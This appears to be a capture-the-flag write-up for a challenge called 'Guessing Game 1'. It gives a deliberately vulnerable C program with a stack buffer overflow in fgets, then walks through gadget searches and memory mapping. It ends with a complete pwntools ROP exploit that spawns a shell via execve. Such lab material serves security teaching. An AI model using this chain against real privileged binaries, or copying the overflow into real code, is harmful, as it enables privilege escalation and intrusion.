# Guessing Game 1

> I made a simple game to show off my programming skills. See if you can beat
> it!

Program

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100


long increment(long in) {
	return in + 1;
}

long get_random() {
	return rand() % BUFSIZE;
}

int do_stuff() {
	long ans = get_random();
	ans = increment(ans);
	int res = 0;

	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);

	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	int res;

	printf("Welcome to my guessing game!\n\n");

	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}

	return 0;
}
```

## Solution

First step is to find the answer, which is simple enough through trial and
error. Next is to abuse the potential overflow in the `fgets` call in `win`,
which is a call with `size=360` on a buffer of size `BUFSIZE=100`. Inspecting
the file we see it is statically linked:

```
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped
```

Though the stack is not executable:

```
$ execstack --query vuln
- vuln
```

We could try [Return Oriented
Programing](https://en.wikipedia.org/wiki/Return-oriented_programming) (ROP)
here. We will piece together a program to spawn a shell based on instructions
we can find in the binary (of which there should be plenty since it's
statically linked). [`ropper`](https://pypi.org/project/ropper/) is a good
program for investigating, for example:

```
$ ropper --file vuln --search 'pop rdx; ret'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdx; ret

[INFO] File: vuln
0x000000000044cc26: pop rdx; ret;
```

It should be simple enough to craft a syscall to `sys_execve` to spawn our
shell, something similar to `execve("/bin/sh", NULL, NULL)`. Firstly, let's
find out how much we need to overflow to the return address we want to
overwrite:

```
0000000000400c40 <win>:
  400c40:	55                   	push   rbp
  400c41:	48 89 e5             	mov    rbp,rsp
  400c44:	48 83 ec 70          	sub    rsp,0x70
```

So `0x78` bytes should be sufficient. Next, our planned syscall requires a
pointer to a string, let's find somewhere to store this string. Investigating
the program's memory map:

```
$ gdb ./vuln
(gdb) break main
(gbd) run
(gdb) info proc mapping
process 1111
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x4b7000    0xb7000        0x0 /home/user/vuln
            0x6b7000           0x6bd000     0x6000    0xb7000 /home/user/vuln
            0x6bd000           0x6e1000    0x24000        0x0 [heap]
      0x7ffff7ffa000     0x7ffff7ffd000     0x3000        0x0 [vvar]
      0x7ffff7ffd000     0x7ffff7fff000     0x2000        0x0 [vdso]
      0x7ffffffdc000     0x7ffffffff000    0x23000        0x0 [stack]
```

So we could use `0x6bd000` as an address to store our string. Given we can
find basically any instruction we need, crafting our payload is just a matter
of tracking down what we need:

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln")
rop = ROP(elf)

pop_rdx = (rop.find_gadget(["pop rdx", "ret"]))[0]
pop_rax = (rop.find_gadget(["pop rax", "ret"]))[0]
pop_rsi = (rop.find_gadget(["pop rsi", "ret"]))[0]
pop_rdi = (rop.find_gadget(["pop rdi", "ret"]))[0]
syscall = (rop.find_gadget(["syscall"]))[0]

p64 = make_packer(64, endian="little", sign="unsigned")
sys_execve_code = 0X3b

payload = (
    cyclic(0x78)                # overflow until address
    + p64(pop_rdx)
    + p64(0X0068732f6e69622f)   # "/bin/sh\0"
    + p64(pop_rdi)
    + p64(0X6bd000)             # start of heap, somewhere for the string
    + p64(0x436393)             # mov qword ptr [rdi], rdx ; ret (couldn't find with pwn)
    + p64(pop_rsi)
    + p64(0)
    + p64(pop_rdx)
    + p64(0)
    + p64(pop_rax)
    + p64(sys_execve_code)
    + p64(syscall)              # syscall == execve("/bin/sh\0", NULL, NULL);
)

p = process("./vuln")
p.recvuntil("guess?\n")
p.sendline("84")
p.recvuntil("\nName? ")
p.sendline(payload)
p.interactive()
```
